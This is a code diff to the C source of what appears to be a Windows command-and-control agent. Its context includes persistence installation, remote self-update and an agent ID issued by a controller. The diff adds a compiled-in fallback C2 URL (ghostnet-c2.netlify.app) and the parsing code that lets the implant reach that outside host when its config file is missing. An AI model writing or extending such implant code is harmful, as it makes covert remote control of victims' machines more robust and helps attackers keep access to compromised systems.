@@ -77,6 +77,13 @@
 #define NI_MAXHOST 1025
 #endif
 
+/* ---------- compiled-in C2 URL fallback ---------- */
+/* Used when agent_config.json is not found alongside the binary.
+ * Change this or set DEFAULT_C2_URL to "" to disable. */
+#ifndef DEFAULT_C2_URL
+#define DEFAULT_C2_URL "https://ghostnet-c2.netlify.app"
+#endif
+
 /* ---------- forward declarations ---------- */
 
 static void c2_update(const char *url, const char *expected_sha256);
@@ -472,6 +479,39 @@ static int config_load(const char *filepath) {
     }
 
     return 1;
+}
+
+/* Apply the compiled-in default C2 URL if no config was loaded. */
+static void config_apply_default_url(void) {
+    if (g_c2_url[0]) return;  /* already set from config file */
+
+#ifdef DEFAULT_C2_URL
+    strncpy(g_c2_url, DEFAULT_C2_URL, MAX_URL_LEN - 1);
+    g_c2_url[MAX_URL_LEN - 1] = '\0';
+
+    const char *url = g_c2_url;
+    if (strncmp(url, "https://", 8) == 0) {
+        g_use_https = 1;
+        g_c2_port = (g_c2_port != 0) ? g_c2_port : 443;
+        url += 8;
+    } else if (strncmp(url, "http://", 7) == 0) {
+        g_use_https = 0;
+        g_c2_port = (g_c2_port != 0) ? g_c2_port : 80;
+        url += 7;
+    }
+
+    const char *slash = strchr(url, '/');
+    if (slash) {
+        int host_len = (int)(slash - url);
+        if (host_len >= MAX_HOST_LEN) host_len = MAX_HOST_LEN - 1;
+        memcpy(g_c2_host, url, host_len);
+        g_c2_host[host_len] = '\0';
+    } else {
+        strncpy(g_c2_host, url, MAX_HOST_LEN - 1);
+    }
+
+    log_write("config: using compiled-in default C2 URL");
+#endif
 }
 
 /* update agent_config.json with the assigned agent_id */
@@ -1953,6 +1993,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
         strcpy(config_path, "agent_config.json");
     }
     config_load(config_path);
+    config_apply_default_url();
 
     /* --- install persistence --- */
     persistence_install();
